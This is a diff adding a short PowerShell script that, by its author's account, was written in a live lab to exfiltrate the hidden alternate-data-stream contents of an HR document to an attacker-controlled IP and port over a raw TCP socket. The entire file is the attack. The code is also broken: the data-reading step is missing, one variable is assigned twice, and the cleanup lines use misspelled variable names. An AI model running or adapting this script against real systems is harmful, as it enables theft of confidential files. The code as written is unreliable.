@@ -1,0 +1,23 @@
+##This is a script I wrote during a live lab to transfer the contents of a ADS file from a local machine to a remote attackbox.
+
+
+# define file path,ads name,remote ip, remote port
+$filePath = 'C:\HR\TERMS.docx'
+$adsName = 'details.txt'
+$attackerIp = '192.254.0.0'
+$attackerPort = 4567
+
+#read the ads file
+$tcpClient = New-Object System.Net.Sockets.TcpClient($attackerIp, $attackerPort)
+$networkStream = $tcpClient.GetStream()
+$streamWriter = $tcpClient.GetStream()
+$streamWriter = New-Object System.IO.StreamWriter($networkStream)
+$streamWriter.AutoFlush = $true
+
+#send the content
+$streamWriter.Write($adsContent)
+$streamWrite.Close()
+$networkStream.Close()
+$tcp.Client.Close()
+
+Write-Output "ADS contents sent to $attackerIp on port $attackerPort."
